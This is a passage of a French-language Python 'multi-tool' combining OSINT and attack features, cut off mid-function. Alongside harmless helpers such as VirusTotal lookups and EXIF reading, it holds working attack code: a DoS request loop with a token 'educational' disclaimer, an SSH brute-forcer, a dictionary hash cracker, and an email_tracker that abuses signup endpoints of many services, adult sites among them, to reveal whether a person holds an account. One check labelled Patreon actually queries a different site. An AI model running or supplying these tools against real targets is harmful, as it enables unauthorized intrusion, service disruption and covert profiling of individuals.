import os
import time
import socket
import logging
from PIL import ExifTags
import paramiko
import hashlib
import requests
from bs4 import BeautifulSoup
import dns.resolver
import re


from dotenv import load_dotenv
from PIL import Image
import requests
from utils.utils import print_colored_message, is_valid_ip, non_détéctés, malvaillant, innofensives, suspectes
import base64
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from pystyle import Colorate, Colors

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s')

IPGEO_API_KEY = os.getenv("IPGEO_API_KEY", "votre_ipgeolocation_api_key")
ABUSEIPDB_API_KEY = os.getenv("ABUSEIPDB_API_KEY", "votre_abuseipdb_api_key")
ABSTRACTAPI_KEY = os.getenv("ABSTRACT_API_KEY", "votre_abstract_key")
VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "VOTRE_CLE_API_VIRUSTOTAL")
VULNERS_API_URL = os.getenv("VULNERS_API_URL")

def recuperer_entetes_http(url):
    try:
        response = requests.head(url, timeout=10)
        print_colored_message(f"\n{'=' * 60}\nEn-têtes HTTP pour {url}\n{'=' * 60}")
        for en_tete, valeur in response.headers.items():
            print_colored_message(f"{en_tete}: {valeur}")
    except requests.RequestException as e:
        print_colored_message(f"Erreur lors de la récupération des en-têtes HTTP : {e}")



def analyser_ip_virustotal(ip_address):
    if not is_valid_ip(ip_address):
        print_colored_message("Adresse IP invalide. Format attendu : X.X.X.X")
        return

    try:
        url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip_address}"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        data = response.json()

        print_colored_message(f"\n{'=' * 60}\nAnalyse VirusTotal pour {ip_address}\n{'=' * 60}")
        if 'data' in data and 'attributes' in data['data']:
            attributes = data['data']['attributes']
            if 'last_analysis_stats' in attributes:
                stats = attributes['last_analysis_stats']
                print_colored_message(f"→ Détections malveillantes : {stats['malicious']}")
                print_colored_message(f"→ Détections suspectes : {stats['suspicious']}")
                print_colored_message(f"→ Détections inoffensives : {stats['harmless']}")
                print_colored_message(f"→ Détections non détectées : {stats['undetected']}")
            else:
                print_colored_message("→ Aucune statistique d'analyse disponible.")
        else:
            print_colored_message("→ Aucune information trouvée pour cette adresse IP.")

    except requests.exceptions.HTTPError as e:
        logging.error(f"Erreur HTTP lors de l'analyse VirusTotal (IP) : {e}")
        print_colored_message(f"Erreur HTTP lors de l'analyse VirusTotal (IP) : {e}")
    except requests.Timeout as e:
        logging.error(f"Le délai d'attente pour la requête a expiré : {e}")
        print_colored_message("Le délai d'attente pour la requête a expiré. Veuillez réessayer.")
    except requests.ConnectionError as e:
        logging.error(f"Erreur de connexion réseau : {e}")
        print_colored_message("Impossible de se connecter au serveur. Vérifiez votre connexion réseau.")
    except requests.RequestException as e:
        logging.error(f"Erreur lors de l'analyse VirusTotal (IP) : {e}")
        print_colored_message("Une erreur s'est produite lors de la requête. Veuillez vérifier l'URL ou les paramètres.")
    except Exception as e:
        logging.error(f"Une erreur inattendue s'est produite : {e}")
        print_colored_message(f"Une erreur inattendue s'est produite. Détails : {e}")

def analyser_fichier_virustotal(chemin_fichier):
    try:
        print_colored_message(f"Analyse du fichier {chemin_fichier} avec VirusTotal...")
        with open(chemin_fichier, "rb") as fichier:
            fichier_a_analyser = fichier.read()
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {"file": (os.path.basename(chemin_fichier), fichier_a_analyser)}
        response = requests.post(url, headers=headers, files=files, timeout=60)  # Augmente le délai d'attente
        response.raise_for_status()
        data = response.json()

        if 'data' in data and 'id' in data['data']:
            analysis_id = data['data']['id']
            print_colored_message(f"ID d'analyse : {analysis_id}")
            time.sleep(10)  # Attendre 10 secondes pour que l'analyse soit terminée
            analysis_url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
            analysis_response = requests.get(analysis_url, headers=headers, timeout=20)
            analysis_response.raise_for_status()
            analysis_data = analysis_response.json()

            if 'data' in analysis_data and 'attributes' in analysis_data['data']:
                stats = analysis_data['data']['attributes']['stats']
                print_colored_message(f"→ Détections malveillantes : {stats['malicious']}")
                print_colored_message(f"→ Détections suspectes : {stats['suspicious']}")
                print_colored_message(f"→ Détections inoffensives : {stats['harmless']}")
                print_colored_message(f"→ Détections non détectées : {stats['undetected']}")
            else:
                print_colored_message("→ Aucune statistique d'analyse disponible.")
        else:
            print_colored_message("→ Impossible d'analyser le fichier avec VirusTotal.")

    except FileNotFoundError:
        print_colored_message(f"Erreur: Fichier non trouvé : {chemin_fichier}")
    except requests.exceptions.HTTPError as e:
        logging.error(f"Erreur HTTP lors de l'analyse VirusTotal (fichier) : {e}")
        print_colored_message(f"Erreur HTTP lors de l'analyse VirusTotal (fichier) : {e}")
    except requests.Timeout as e:
        logging.error(f"Le délai d'attente pour la requête a expiré : {e}")
        print_colored_message("Le délai d'attente pour la requête a expiré. Veuillez réessayer.")
    except requests.ConnectionError as e:
        logging.error(f"Erreur de connexion réseau : {e}")
        print_colored_message("Impossible de se connecter au serveur. Vérifiez votre connexion réseau.")
    except requests.RequestException as e:
        logging.error(f"Erreur lors de l'analyse VirusTotal (fichier) : {e}")
        print_colored_message("Une erreur s'est produite lors de la requête. Veuillez vérifier l'URL ou les paramètres.")
    except Exception as e:
        logging.error(f"Une erreur inattendue s'est produite : {e}")
        print_colored_message(f"Une erreur inattendue s'est produite. Détails : {e}")


import requests
from bs4 import BeautifulSoup

def rechercher_nom_utilisateur(username):
    """
    Recherche un nom d'utilisateur sur différentes plateformes et retourne un dictionnaire des résultats.
    """
    sites = {
        "TikTok": "https://www.tiktok.com/@{}",
        "Instagram": "https://www.instagram.com/{}",
        "GitHub": "https://github.com/{}",
        "Pinterest": "https://www.pinterest.com/{}",
        "Snapchat": "https://www.snapchat.com/add/{}",
        "Telegram": "https://t.me/{}",
        "Steam": "https://steamcommunity.com/id/{}",
        "YouTube": "https://www.youtube.com/@{}",
        "Twitter": "https://x.com/{}",
        "LinkedIn": "https://www.linkedin.com/in/{}",
        "Facebook": "https://www.facebook.com/{}",
        "Reddit": "https://www.reddit.com/user/{}",
        "Discord": "https://discord.com/users/{}",
        "Medium": "https://medium.com/@{}",
        "Twitch": "https://www.twitch.tv/{}",
        "Vimeo": "https://vimeo.com/{}",
        "Spotify": "https://open.spotify.com/user/{}",
        "DeviantArt": "https://www.deviantart.com/{}",
        "Behance": "https://www.behance.net/{}",
        "StackOverflow": "https://stackoverflow.com/users/{}",
        "Flickr": "https://www.flickr.com/photos/{}",
        "Dribbble": "https://dribbble.com/{}",
        "Quora": "https://www.quora.com/profile/{}",
        "GitLab": "https://gitlab.com/{}",
        "SoundCloud": "https://soundcloud.com/{}",
        "Goodreads": "https://www.goodreads.com/user/show/{}",
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    session = requests.Session()
    resultats = {}

    try:
        for site_name, url_template in sites.items():
            url = url_template.format(username)
            response = session.get(url, headers=headers, timeout=5)

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                page_text = soup.get_text().lower()
                page_title = getattr(soup.title, "string", "").lower() if soup.title else ""

                # Vérification pour TikTok
                if site_name == "TikTok":
                    if "user not found" in page_text or "sorry, this page isn't available" in page_text:
                        resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        resultats[site_name] = f"✔ Profil trouvé : {url}"

                # Vérification pour Facebook
                elif site_name == "Facebook":
                    if response.status_code == 400:
                        resultats[site_name] = "⚠ Erreur HTTP (400) - Requête malformée. Vérifiez le nom d'utilisateur ou l'URL."
                    elif "Page not found" in page_text or "This content isn't available right now" in page_text:
                        # Vérifier si le profil est vraiment inexistant ou si la page est privée
                        if "This content isn't available right now" in page_text:
                            resultats[site_name] = "⚠ Profil privé ou inaccessibilité pour des raisons de confidentialité"
                        else:
                            resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        # Si le profil existe et est accessible
                        resultats[site_name] = f"✔ Profil trouvé : {url}"
                # Vérification pour Instagram
                elif site_name == "Instagram":
                    if "Sorry, this page isn't available" in page_text or "Sorry, this page is unavailable" in page_text:
                        resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        resultats[site_name] = f"✔ Profil trouvé : {url}"

                # Vérification pour YouTube
                elif site_name == "YouTube":
                    if "This channel does not exist" in page_text or "Video unavailable" in page_text:
                        resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        resultats[site_name] = f"✔ Profil trouvé : {url}"

                # Vérification pour Twitch
                elif site_name == "Twitch":
                    if "Sorry, this page is unavailable" in page_text or "User not found" in page_text:
                        resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        resultats[site_name] = f"✔ Profil trouvé : {url}"

                # Vérification pour Twitter
                elif site_name == "Twitter":
                    if "Sorry, that page doesn’t exist" in page_text or "The account is unavailable" in page_text:
                        resultats[site_name] = "✘ Profil non trouvé"
                    else:
                        resultats[site_name] = f"✔ Profil trouvé : {url}"

                # Vérification générale si le nom d'utilisateur est trouvé dans le texte de la page
                elif username.lower() in page_text or username.lower() in page_title:
                    resultats[site_name] = f"✔ Profil trouvé : {url}"
                else:
                    resultats[site_name] = "✘ Profil non trouvé"

            elif response.status_code == 403:
                resultats[site_name] = "⚠ Accès refusé (403) - Protection activée"

            elif response.status_code == 429:
                resultats[site_name] = "⚠ Trop de requêtes (429) - Attends un peu"

            else:
                resultats[site_name] = f"✘ Erreur HTTP ({response.status_code})"

    except requests.exceptions.RequestException as e:
        resultats["Erreur générale"] = f"✘ Erreur de connexion : {str(e)}"

    except Exception as e:
        resultats["Erreur générale"] = f"✘ Erreur inattendue : {str(e)}"

    return resultats if resultats else {}  # Retourne un dict vide si aucun résultat



def trouver_mon_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        data = response.json()
        return data['ip']
    except requests.RequestException as e:
        logging.error(f"Erreur lors de la récupération de l'adresse IP : {e}")
        print_colored_message(f"Erreur lors de la récupération de l'adresse IP : {e}")
        return "Impossible de trouver l'adresse IP"

def afficher_conseils_vie_privee():
    print_colored_message("\n🔒 Conseils pour Protéger Votre Vie Privée en Ligne 🛡️")
    conseils = [
       "→ Utilisez un VPN pour masquer votre adresse IP."
       "→ Activez l'authentification à deux facteurs sur tous vos comptes."
       "→ Utilisez des mots de passe forts et uniques."
       "→ Vérifiez régulièrement les paramètres de confidentialité de vos réseaux sociaux."
       "→ Méfiez-vous des e-mails et des liens suspects."
       "→ Utilisez un navigateur axé sur la confidentialité (ex : Brave, Firefox avec extensions)."
       "→ Mettez à jour régulièrement vos logiciels et systèmes d'exploitation."
       "→ Désactivez les services de géolocalisation lorsque vous n'en avez pas besoin."
       "→ Utilisez des bloqueurs de publicités et de trackers pour limiter le suivi."
       "→ Privilégiez des moteurs de recherche respectueux de la vie privée, comme DuckDuckGo."
    ]
    for conseil in conseils:
        print_colored_message(conseil)

def dos_attack(ip_address, num_requests=100, port=80):
    if not is_valid_ip(ip_address):
        print_colored_message("❌ Adresse IP invalide. Format attendu : X.X.X.X")
        return

    if not (1 <= port <= 65535):
        print_colored_message("❌ Port invalide. Le port doit être compris entre 1 et 65535.")
        return

    try:
        print_colored_message(f"⚠️ Simulation d'une attaque DOS vers {ip_address} sur le port {port} avec {num_requests} requêtes.")
        print_colored_message("Ceci est à des fins éducatives uniquement. N'utilisez pas cette fonction sur des cibles non autorisées.")

        for i in range(num_requests):
            try:
                # Créer un socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)  # Ajouter un timeout pour éviter les blocages

                # Connexion au serveur
                sock.connect((ip_address, port))

                # Envoi d'une requête HTTP GET basique
                sock.send(b"GET / HTTP/1.1\r\nHost: " + ip_address.encode() + b"\r\n\r\n")
                sock.close()

                # Affichage de la progression
                print_colored_message(f"→ Requête {i + 1} envoyée.")

            except socket.error as e:
                logging.error(f"Erreur lors de l'envoi de la requête {i + 1} : {e}")
                print_colored_message(f"❌ Erreur lors de l'envoi de la requête {i + 1} : {e}")
                break

        print_colored_message(f"\n✅ Simulation terminée. {num_requests} requêtes envoyées à {ip_address}.")
    
    except Exception as e:
        logging.error(f"Une erreur s'est produite lors de l'attaque DOS : {e}")
        print_colored_message(f"❌ Une erreur s'est produite lors de l'attaque DOS : {e}")

def get_exif_info(image_path):
    """
    Récupère et affiche les informations EXIF d'une image.

    Args:
        image_path (str): Chemin vers le fichier image.

    Returns:
        None: Affiche les informations EXIF dans la console.
    """
    try:
        # Ouvrir l'image
        image = Image.open(image_path)

        # Vérifier si l'image contient des données EXIF
        if hasattr(image, "_getexif") and image._getexif() is not None:
            exif_data = image._getexif()

            if exif_data:
                print_colored_message(f"\n{'=' * 60}\nInformations EXIF pour {image_path}\n{'=' * 60}")

                # Parcourir les données EXIF et afficher les informations lisibles
                for tag_id, value in exif_data.items():
                    tag = ExifTags.TAGS.get(tag_id, tag_id)
                    # Vérifier si la valeur peut être un objet complexe comme une date ou une géolocalisation
                    if isinstance(value, bytes):
                        value = value.decode('utf-8', errors='ignore')
                    elif isinstance(value, tuple):
                        value = ", ".join(map(str, value))
                    print_colored_message(f"{tag}: {value}")
            else:
                print_colored_message("Aucune donnée EXIF n'est disponible, ou elle est vide.")

        else:
            print_colored_message("Aucune information EXIF trouvée dans cette image.")

    except FileNotFoundError:
        print_colored_message(f"Erreur: Fichier image non trouvé : {image_path}")
    except Exception as e:
        logging.error(f"Une erreur s'est produite lors de la récupération des informations EXIF : {e}")
        print_colored_message(f"Une erreur s'est produite lors de la récupération des informations EXIF : {e}")

def force_brute_ssh(ip_address, username, password_list):
    """
    Tente une attaque par force brute sur un service SSH avec une liste de mots de passe.
    :param ip_address: L'adresse IP de la machine cible
    :param username: Le nom d'utilisateur cible
    :param password_list: Liste de mots de passe à tester
    """
    print_colored_message(f"Test de Force Brute sur SSH pour {ip_address} avec l'utilisateur {username}...\n")

    for password in password_list:
        try:
            # Création de la connexion SSH
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip_address, username=username, password=password)
            print_colored_message(f"Mot de passe trouvé: {password}")
            ssh.close()
            return password  # Retourner le mot de passe trouvé
        except paramiko.AuthenticationException:
            print_colored_message(f"Mot de passe incorrect: {password}")
        except Exception as e:
            print_colored_message(f"Erreur lors de la connexion SSH: {str(e)}")
    print_colored_message("Aucun mot de passe valide trouvé.")
    return None


def run_brute_force_attack():
    ip_address = input("Entrez l'adresse IP de la cible : ")
    username = input("Entrez le nom d'utilisateur : ")
    password_file = input("Entrez le chemin du fichier contenant les mots de passe : ")

    try:
        with open(password_file, 'r') as file:
            password_list = file.readlines()
            password_list = [password.strip() for password in password_list]
            force_brute_ssh(ip_address, username, password_list)
    except FileNotFoundError:
        print_colored_message("Le fichier de mots de passe n'a pas été trouvé.")
    except Exception as e:
        print_colored_message(f"Erreur: {str(e)}")


def convert_text_to_base64(text):
    """
    Convertit le texte en base64.
    """
    try:
        # Encoder le texte en base64
        encoded_text = base64.b64encode(text.encode('utf-8')).decode('utf-8')
        print(f"Texte en Base64: {encoded_text}")
    except Exception as e:
        print(f"Erreur lors de la conversion en Base64: {str(e)}")


def crack_password_hash(hashed_password, hash_type='md5', dictionary_file='passwords.txt'):
    """
    Tente de cracker un mot de passe haché en utilisant un fichier dictionnaire.
    """
    try:
        # Ouverture du fichier dictionnaire
        with open(dictionary_file, 'r') as file:
            for line in file:
                word = line.strip()
                
                # Créer le hash du mot de passe du dictionnaire
                if hash_type == 'md5':
                    hashed_word = hashlib.md5(word.encode('utf-8')).hexdigest()
                elif hash_type == 'sha1':
                    hashed_word = hashlib.sha1(word.encode('utf-8')).hexdigest()
                elif hash_type == 'sha256':
                    hashed_word = hashlib.sha256(word.encode('utf-8')).hexdigest()
                else:
                    print("Méthode de hashage inconnue")
                    return
                
                # Comparer le hash généré avec le hash fourni
                if hashed_word == hashed_password:
                    print(f"Mot de passe trouvé: {word}")
                    return
            print("Aucun mot de passe trouvé dans le dictionnaire.")
    except Exception as e:
        print(f"Erreur: {str(e)}")

def phone_lookup():
    print(Colorate.Horizontal(Colors.yellow_to_green, "\n[📱] RECHERCHE DE NUMÉRO DE TÉLÉPHONE"))
    
    try:
        # Demander le numéro
        phone_number = input(Colorate.Horizontal(Colors.blue_to_cyan, "\nEntrez le numéro (format international +33...) » "))
        
        # Parser le numéro
        parsed_number = phonenumbers.parse(phone_number, None)
        
        # Vérification basique
        if not phonenumbers.is_valid_number(parsed_number):
            print(Colorate.Horizontal(Colors.red, "\n[!] Numéro invalide !"))
            return

        # Récupération des informations
        country_code = f"+{parsed_number.country_code}"
        operator = carrier.name_for_number(parsed_number, "fr") or "Inconnu"
        timezone_info = timezone.time_zones_for_number(parsed_number)[0] if timezone.time_zones_for_number(parsed_number) else "Inconnu"
        country = phonenumbers.region_code_for_number(parsed_number) or "Inconnu"
        region = geocoder.description_for_number(parsed_number, "fr") or "Inconnu"
        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)

        # Affichage stylisé
        print(Colorate.Horizontal(Colors.purple_to_blue, f"""
┌───────────────────────────────
│ 📱 Numéro : {phone_number}
│ 🌍 Pays : {country} ({country_code})
│ 📍 Région : {region}
│ ⏰ Fuseau horaire : {timezone_info}
│ 📶 Opérateur : {operator}
│ 🔢 Formaté : {formatted_number}
└───────────────────────────────"""))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red, f"\n[!] Erreur : {str(e)}"))


def email_tracker():
    try:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

        def Instagram(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Origin': 'https://www.instagram.com',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.instagram.com/'
                }

                data = {"email": email}

                response = session.get("https://www.instagram.com/accounts/emailsignup/", headers=headers)
                if response.status_code != 200:
                    return f"Error: {response.status_code}"

                token = session.cookies.get('csrftoken')
                if not token:
                    return "Error: Token Not Found."

                headers["x-csrftoken"] = token
                headers["Referer"] = "https://www.instagram.com/accounts/emailsignup/"

                response = session.post(
                    url="https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/",
                    headers=headers,
                    data=data
                )
                if response.status_code == 200:
                    if "Another account is using the same email." in response.text or "email_is_taken" in response.text:
                        return True
                    return False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Twitter(email):
            try:
                session = requests.Session()
                response = session.get(
                    url="https://api.twitter.com/i/users/email_available.json",
                    params={"email": email}
                )
                if response.status_code == 200:
                    return response.json()["taken"]
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Pinterest(email):
            try:
                session = requests.Session()
                response = session.get(
                    "https://www.pinterest.com/_ngjs/resource/EmailExistsResource/get/",
                    params={"source_url": "/", "data": '{"options": {"email": "' + email + '"}, "context": {}}'}
                )

                if response.status_code == 200:
                    data = response.json()["resource_response"]
                    if data["message"] == "Invalid email.":
                        return False
                    return data["data"] is not False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Imgur(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'Accept-Language': 'en,en-US;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://imgur.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'TE': 'Trailers',
                }

                r = session.get("https://imgur.com/register?redirect=%2Fuser", headers=headers)

                headers["X-Requested-With"] = "XMLHttpRequest"

                data = {'email': email}
                response = session.post('https://imgur.com/signin/ajax_email_available', headers=headers, data=data)

                if response.status_code == 200:
                    data = response.json()['data']
                    if data["available"]:
                        return False
                    if "Invalid email domain" in response.text:
                        return False
                    return True
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Patreon(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.plurk.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                }

                data = {'email': email}
                response = session.post('https://www.plurk.com/Users/isEmailFound', headers=headers, data=data)
                if response.status_code == 200:
                    return "True" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Spotify(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                }
            
                params = {'validate': '1', 'email': email}
                response = session.get('https://spclient.wg.spotify.com/signup/public/v1/account',
                        headers=headers,
                        params=params)
                if response.status_code == 200:
                    status = response.json()["status"]
                    return status == 20
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def FireFox(email):
            try:
                session = requests.Session()
                data = {"email": email}
                response = session.post("https://api.accounts.firefox.com/v1/account/status", data=data)

                if response.status_code == 200:
                    return "false" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def LastPass(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'Accept-Language': 'en,en-US;q=0.5',
                    'Referer': 'https://lastpass.com/',
                    'X-Requested-With': 'XMLHttpRequest',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'TE': 'Trailers',
                }
                params = {
                    'check': 'avail',
                    'skipcontent': '1',
                    'mistype': '1',
                    'username': email,
                }
            
                response = session.get(
                    'https://lastpass.com/create_account.php?check=avail&skipcontent=1&mistype=1&username='+str(email).replace("@", "%40"),       
                    params=params,
                    headers=headers)
            
                if response.status_code == 200:
                    if "no" in response.text:
                        return True
                    return False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Archive(email):
            try:
                session = requests.Session()

                headers = {
                    'User-Agent': user_agent,
                    'Accept': '*/*',
                    'Accept-Language': 'en,en-US;q=0.5',
                    'Content-Type': 'multipart/form-data; boundary=---------------------------',
                    'Origin': 'https://archive.org',
                    'Connection': 'keep-alive',
                    'Referer': 'https://archive.org/account/signup',
                    'Sec-GPC': '1',
                    'TE': 'Trailers',
                }

                data = '-----------------------------\r\nContent-Disposition: form-data; name="input_name"\r\n\r\nusername\r\n-----------------------------\r\nContent-Disposition: form-data; name="input_value"\r\n\r\n' + email + \
                    '\r\n-----------------------------\r\nContent-Disposition: form-data; name="input_validator"\r\n\r\ntrue\r\n-----------------------------\r\nContent-Disposition: form-data; name="submit_by_js"\r\n\r\ntrue\r\n-------------------------------\r\n'

                response = session.post('https://archive.org/account/signup', headers=headers, data=data)
                if response.status_code == 200:
                    return "is already taken." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def PornHub(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en,en-US;q=0.5',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
            
                response = session.get("https://www.pornhub.com/signup", headers=headers)
                if response.status_code == 200:
                    token = BeautifulSoup(response.content, features="html.parser").find(attrs={"name": "token"})
                    if token is None:
                        return "Error: Token Not Found."
                
                    token = token.get("value")
                else:
                    return f"Error: {response.status_code}"
                # En-têtes pour la requête POST
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.pornhub.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.pornhub.com/signup'
                }
                # Données pour la requête POST
                params = {'token': token}
                data = {'check_what': 'email', 'email': email}
                response = session.post('https://www.pornhub.com/user/create_account_check', headers=headers, params=params, data=data) 
                if response.status_code == 200:
                    if response.json()["error_message"] == "Email has been taken.":
                        return True
                    return False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Xnxx(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-en',
                    'Host': 'www.xnxx.com',
                    'Referer': 'https://www.google.com/',
                    'Connection': 'keep-alive'
                }
            
                cookie = session.get('https://www.xnxx.com', headers=headers)

                if cookie.status_code != 200:
                    return f"Error: {cookie.status_code}"

                headers['Referer'] = 'https://www.xnxx.com/video-holehe/palenath_fucks_xnxx_with_holehe'
                headers['X-Requested-With'] = 'XMLHttpRequest'
                email = email.replace('@', '%40')

                response = session.get(f'https://www.xnxx.com/account/checkemail?email={email}', headers=headers, cookies=cookie.cookies)
            
                if response.status_code == 200:
                    try:
                        if response.json()['message'] == "This email is already in use or its owner has excluded it from our website.":
                            return True
                        elif response.json()['message'] == "Invalid email address.": 
                            return False
                    except:
                        pass    
                    if response.json()['result'] == "false":
                        return True
                    elif response.json()['code'] == 1:
                        return True
                    elif response.json()['result'] == "true":
                        return False
                    elif response.json()['code'] == 0:
                        return False  
                    else:
                        return False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Xvideo(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.xvideos.com/',
                }

                params = {'email': email}
                response = session.get('https://www.xvideos.com/account/checkemail', headers=headers, params=params)
                if response.status_code == 200:
                    try:
                        if response.json()['message'] == "This email is already in use or its owner has excluded it from our website.": 
                            return True
                        elif response.json()['message'] == "Invalid email address.": 
                            return False
                    except: 
                        pass    
                    if response.json()['result'] == "false":
                        return True
                    elif response.json()['code'] == 1:
                        return True
                    elif response.json()['result'] == "true":
                        return False
                    elif response.json()['code'] == 0:
                        return False  
                    else:
                        return False
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"
        
        def Facebook(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.facebook.com/login/identify/?email={email}", headers=headers)
                if response.status_code == 200:
                    return "This email address is connected to an account" in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def LinkedIn(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://www.linkedin.com/search/results/people/?keywords={email}", headers=headers)
                if response.status_code == 200:
                    return "No results found" not in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Reddit(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Origin': 'https://www.reddit.com',
                    'Connection': 'keep-alive',
                }
                data = {'email': email}
                response = session.post("https://www.reddit.com/api/register_email", headers=headers, data=data)
                if response.status_code == 200:
                    return response.json()['errors'] == []
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Google(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://accounts.google.com/signup/v2/web/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=SignUp&Email={email}", headers=headers)
                if response.status_code == 200:
                    return "That username is taken. Try another." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"
        
        def Yahoo(email):
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
                response = session.get(f"https://login.yahoo.com/account/create?specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com&src=fpctx&intl=us&lang=en-US&email={email}", headers=headers)
                if response.status_code == 200:
                    return "This email address is already in use." in response.text
                return f"Error: {response.status_code}"
            except Exception as e:
                return f"Error: {e}"

        def Microsoft(email):
            try:
